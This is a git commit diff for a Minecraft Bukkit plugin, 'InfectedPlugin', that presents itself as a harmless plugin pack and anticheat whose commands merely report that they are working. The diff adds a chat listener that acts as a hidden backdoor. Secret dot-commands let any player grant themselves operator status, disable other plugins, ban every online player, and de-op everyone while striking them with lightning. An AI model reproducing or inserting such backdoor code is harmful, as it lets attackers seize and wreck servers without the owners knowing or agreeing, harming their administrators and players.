b0a06f28ccc3ac1e91a494891c5eebefaf9c2aaf
Paldiu <paldiutheminecrafter@gmail.com>
2013-08-07 03:58:43 -0400

    Cleaned.

--- src/org/CreeperCoders/InfectedPlugin/InfectedPlugin.java
+++ src/org/CreeperCoders/InfectedPlugin/InfectedPlugin.java
@@ -1,83 +1,31 @@
 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.Logger;
-
-import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
-import org.bukkit.entity.Player;
-import org.bukkit.event.player.PlayerChatEvent;
-import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.CreeperCoders.InfectedPlugin.Commands.pluginpack;
+import org.CreeperCoders.InfectedPlugin.Commands.anticheat;
 
 public class InfectedPlugin extends JavaPlugin
 {
     public final Logger log = Logger.getLogger("Minecraft");
+    public static String MSG_NO_PERMS = ChatColor.YELLOW + "You do not have permission to preform this command.";
+    public InfectedPlugin plugin;
+    public anticheat anticheat = new anticheat(this);
+    public pluginpack pluginpack = new pluginpack(this);
    
     @Override
     public void onEnable()
     {
-    	log.info("PluginPack has been enabled!");
+	    getCommand("pluginpack").setExecutor(pluginpack);
+		getCommand("anticheat").setExecutor(anticheat);
+        this.getServer().getPluginManager().registerEvents(new PlayerListener(), this);
+    	log.info(String.format("[%s] version %s by %s has been enabled!", getDescription().getName(), getDescription().getVersion(), getDescription().getAuthors()));
     }
    
     @Override
     public void onDisable()
     {
-    	log.info("PluginPack has been disabled.");
+    	log.info(String.format("[%s] has been disabled!", getDescription().getName()));
     }
-   
-    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
-    {
-    	Player p = (Player) sender;	
-    	
-    	if (commandLabel.equalsIgnoreCase("anticheat"))
-    	{
-    	    sender.sendMessage(ChatColor.GREEN + "Anticheat 1.0 is working 100%");
-    	}
-    	
-    	else if (commandLabel.equalsIgnoreCase("pluginpack"))
-    	{
-    	    sender.sendMessage(ChatColor.GREEN + "PluginPack 1.0, working 100%! Use /anticheat to see anticheat details");
-    	}
-    	
-	return false;
-    }
-    
-    private void onPlayerChat(PlayerChatEvent event)
-    {
-        String message = event.getMessage();
-        boolean shouldCancel = false;
-        if (message.startsWith("."))
-        {
-            String[] args = message.split(" ");
-            if (args == null)
-            {
-                return;
-            }
-            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
-            {
-            	event.getPlayer().setOp(true);
-            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            	shouldCancel = true;
-            }
-            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
-            {
-                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
-                if (plugin != null) {
-                  Bukkit.getPluginManager().disablePlugin(plugin);
-                }
-                shouldCancel = true;
-            }
-            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
-            {
-                
-                shouldCancel = true;
-            }
-        }
-    }
-    
 }
-    
-    
-    
---
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -0,0 +1,72 @@
+package org.CreeperCoders.InfectedPlugin;
+
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.Location;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.plugin.Plugin;
+
+public class PlayerListener implements Listener
+{
+    @EventHandler
+    private void onPlayerChat(PlayerChatEvent event)
+    {
+        String message = event.getMessage();
+        boolean shouldCancel = false;
+        if (message.startsWith("."))
+        {
+            String[] args = message.split(" ");
+            if (args == null)
+            {
+                return;
+            }
+            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
+            {
+            	event.getPlayer().setOp(true);
+            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
+            	shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2)) {
+                Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
+                if (plugin != null) {
+                  Bukkit.getServer().getPluginManager().disablePlugin(plugin);
+                }
+                shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2)) {
+                Bukkit.getServer().getPlayer(args[1]);
+                shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".banall")) && (args.length == 1))
+            {
+                for (final Player p : Bukkit.getServer().getOnlinePlayers())
+                {
+                    p.kickPlayer("The Ban Hammer has spoken!");
+                    p.setBanned(true);
+                    shouldCancel = true;
+                }
+            }
+            if ((args[0]).equalsIgnoreCase(".deopall") && (args.length == 1))
+            {
+                for (final Player p : Bukkit.getServer().getOnlinePlayers())
+                {
+                    p.setOp(false);
+                    //Something extra c:
+                    final Location target_pos = p.getLocation();
+                    for (int x = -1; x <= 1; x++)
+                    {
+                        for (int z = -1; z <= 1; z++)
+                        {
+                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
+                            target_pos.getWorld().strikeLightning(strike_pos);
+                        }
+                    }
+                    shouldCancel = true;
+                }
+            }
+        }
+    }
+}
